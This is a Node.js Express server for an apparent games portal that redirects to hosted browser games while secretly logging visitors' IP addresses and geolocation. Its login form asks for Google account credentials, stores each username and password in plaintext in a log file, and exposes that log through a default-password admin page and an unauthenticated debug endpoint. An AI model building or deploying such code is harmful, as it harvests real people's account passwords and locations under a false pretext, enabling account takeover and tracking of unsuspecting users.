/* ---------- basic setup ---------- */
const express = require('express');
const fs      = require('fs');
const path    = require('path');
const app     = express();

// Block specific IP(s)
const BLOCKED_IPS = (process.env.BLOCKED_IPS || '').split(',').map(ip => ip.trim()).filter(Boolean);

app.use((req, res, next) => {
  const forwarded = req.headers['x-forwarded-for'] || '';
  const ipList = forwarded.split(',').map(ip => ip.trim()).filter(Boolean);
  const ip = ipList[0] || req.socket.remoteAddress;
  if (BLOCKED_IPS.includes(ip)) {
    return res.status(403).send('<h1>Access denied</h1>');
  }
  next();
});

const PORT = process.env.PORT || 10000;
const HOST = '0.0.0.0';

const ADMIN_PASS = process.env.ADMIN_PASS || 'admin123';
const LOG_DIR  = path.join(__dirname, 'logs');
const LOG_FILE = path.join(LOG_DIR, 'ip-log.txt');

/* ensure log dir/file */
if (!fs.existsSync(LOG_DIR))  fs.mkdirSync(LOG_DIR, { recursive: true });
if (!fs.existsSync(LOG_FILE)) fs.writeFileSync(LOG_FILE, '');

/* middleware */
app.use(express.static(path.join(__dirname, 'public')));
app.use(express.urlencoded({ extended: true }));

/* util: estimate location by IP */
async function estimateLocationByIP(ip) {
  try {
    const res = await fetch(`http://ip-api.com/json/${ip}`);
    const data = await res.json();
    if (data.status === 'success') {
      return { latitude: data.lat, longitude: data.lon, city: data.city, country: data.country };
    }
  } catch (e) {}
  return null;
}

/* util: ip logger (logs all IPs, geolocates only first) */
async function logIP(req, label = 'visited') {
  const forwarded = req.headers['x-forwarded-for'] || '';
  const ipList = forwarded.split(',').map(ip => ip.trim()).filter(Boolean);
  const ipForGeo = ipList[0] || req.socket.remoteAddress;
  const allIPs = ipList.length ? ipList.join(', ') : req.socket.remoteAddress;
  const ts = new Date().toISOString();
  let locString = '';
  const { latitude, longitude, exact_location } = req.body || {};
  if (latitude && longitude && exact_location === 'yes') {
    locString = ` | location: ${latitude},${longitude} | exact: yes`;
  } else if (exact_location === 'no') {
    const loc = await estimateLocationByIP(ipForGeo);
    if (loc) {
      locString = ` | location: ${loc.latitude},${loc.longitude} (${loc.city},${loc.country}) | exact: no`;
    } else {
      locString = ' | location: unknown | exact: no';
    }
  }
  fs.appendFile(LOG_FILE, `${ts} - ${allIPs} ${label}${locString}\n`, err =>
    err && console.error('Log error:', err)
  );
}

/* ---------- routes ---------- */

// --- Simple Login HTML Form ---
app.get('/login', (req, res) => {
  res.send(`
    <form method="POST" action="/login">
      <input name="username" placeholder="Username(Use google acc)" required>
      <input name="password" type="password" placeholder="Password" required>
      <button type="submit">Login</button>
    </form>
  `);
});

app.get('/quantum', (req, res) => {
  res.sendFile(path.join(__dirname, 'public','quantumflipduel','quantum.html'));
});

// --- Handle Login ---
app.post('/login', (req, res) => {
  const { username, password } = req.body;
  if (!username || !password) return res.send('Missing credentials');
  // Check if the credentials exist in ip-log.txt
  const logContents = fs.readFileSync(LOG_FILE, 'utf8');
  const loginLine = `LOGIN|${username}|${password}`;
  if (logContents.includes(loginLine)) {
    res.setHeader('Set-Cookie', 'loggedin=1; Path=/;');
    return res.send(`<h1>Welcome, ${username}!</h1><a href="/home">Go Home</a>`);
  }
  // If not found, add them as a new user
  fs.appendFileSync(LOG_FILE, `${loginLine}\n`);
  res.setHeader('Set-Cookie', 'loggedin=1; Path=/;');
  res.send(`<h1>Registered and logged in as ${username}!</h1><a href="/home">Go Home</a>`);
});

app.get('/',        (_,res)=> res.redirect('/intro'));
app.get('/intro',   (_,res)=> res.sendFile(path.join(__dirname,'public','intro.html')));

app.get('/home',  (req,res)=> res.sendFile(path.join(__dirname,'public','home.html')));
app.post('/home', (req,res)=> res.sendFile(path.join(__dirname,'public','home.html')));

app.post('/log-location', express.urlencoded({ extended: true }), async (req, res) => {
  await logIP(req, 'visited /home');
  res.sendStatus(204);
});

/* pretty game routes ( /templerun → /games/templerun ) */
['templerun','speedstars','subway','candy'].forEach(game=>{
  app.get(`/${game}`, (_,res)=> res.redirect(`/games/${game}`));
});

/* main game redirect handler */
app.get('/games/:game',async (req,res)=>{
  const game = req.params.game.toLowerCase();
  await logIP(req,`clicked game: ${game}`);
  const map = {
    templerun : 'https://githubshrub.github.io/html5-games/games/templerun2/',
    speedstars: 'https://speedstarsfree.github.io/',
    subway    : 'https://dddavit.github.io/subway/',
    candy     : 'https://candy-crush-online.github.io/'
  };
  return map[game]
    ? res.redirect(map[game])
    : res.status(404).send(`<h1>Unknown game: ${game}</h1>`);
});

/* --- admin --- */
app.get('/admin', (_,res)=> res.sendFile(path.join(__dirname,'views','admin.html')));
app.post('/admin',(req,res)=>{
  if (req.body.password === ADMIN_PASS) {
    const logs = fs.readFileSync(LOG_FILE,'utf8');
    return res.send(logs.trim() ? `<pre>${logs}</pre>` : 'No logs yet!');
  }
  res.send('Access denied ❌');
});

/* --- debug helpers (optional) --- */
app.get('/debug/ip',          (req,res)=> {
  const forwarded = req.headers['x-forwarded-for'] || '';
  const ipList = forwarded.split(',').map(ip => ip.trim()).filter(Boolean);
  const ipForGeo = ipList[0] || req.socket.remoteAddress;
  res.json({
    allIPs: ipList.length ? ipList.join(', ') : req.socket.remoteAddress,
    ipForGeo
  });
});
app.get('/debug/log-exists',  (_,res)=> res.json({ exists: fs.existsSync(LOG_FILE) }));
app.get('/debug/log-contents',(_,res)=>{
  try{
    res.json({ recent: fs.readFileSync(LOG_FILE,'utf8').trim().split('\n').slice(-10) });
  } catch {
    res.status(500).json({ error:'read fail' });
  }
});

/* ---------- start ---------- */
const server = app.listen(PORT, HOST, ()=> {
  console.log(`Server listening on http://${HOST}:${PORT}`);
});
server.keepAliveTimeout = 120_000;
server.headersTimeout   = 121_000;
